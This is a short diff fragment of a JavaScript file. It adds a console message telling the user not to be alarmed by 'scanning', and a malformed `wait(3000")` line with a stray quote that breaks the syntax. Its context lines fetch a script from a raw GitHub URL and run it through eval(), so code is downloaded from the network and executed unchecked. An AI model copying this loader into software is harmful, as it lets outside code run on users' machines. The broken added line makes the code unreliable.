@@ -43,6 +43,9 @@ const ns = {
   },
 }
 
+console.warn("Starting scanning, don't be alarmed")
+wait(3000")
+
 fetch('https://raw.githubusercontent.com/TaxPRiNTER/ASAM/main/libraries/modules.js')
 .then(response => response.text())
 .then(txt => eval(txt))
